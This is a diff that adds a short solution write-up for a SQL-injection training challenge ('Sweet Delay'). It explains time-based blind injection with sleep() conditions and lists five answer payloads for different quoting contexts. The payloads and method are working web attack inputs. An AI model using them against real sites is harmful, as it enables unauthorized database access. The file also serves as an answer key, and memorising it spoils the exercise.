@@ -1,7 +1,19 @@
 Solutions of Sweet Delay challenge (SQL Ninja):
+(Reference: http://www.securityidiots.com/Web-Pentest/SQL-Injection/time-based-blind-injection.html)
 
-#1.
-#2.
-#3.
-#4.
-#5.
+For these challenge, we see that when we add characters at the end of url, we don't see any differnces in the screen. So we can only try time-based injection.
+Hence, do following steps:
++ Find <special_characters> and <comment_characters> such that:
+...?id=1<special_characters> and sleep(10)<comment_characters> 
+get delay in page loading (NOTE: we need to refresh mutiple times to make sure it is delay or not)
++ Get information by using format:
+...?id=1<special_characters> and (select sleep(10) from dual where (<SQL query returns single row>) <comment_characters>)
+if SQL query returns false, we cannot get delay and otherwise.
+For details of SQL query to get information, see blindluck.txt
+
+Answer:
+#1. ...?id=1 and sleep(10) --+-
+#2. ...?id=1' and sleep(10) --+-
+#3. ...?id=1" and sleep(10) --+-
+#4. ...?id=1) and sleep(10) --+-
+#5. ...?id=1") and sleep(10) --+-
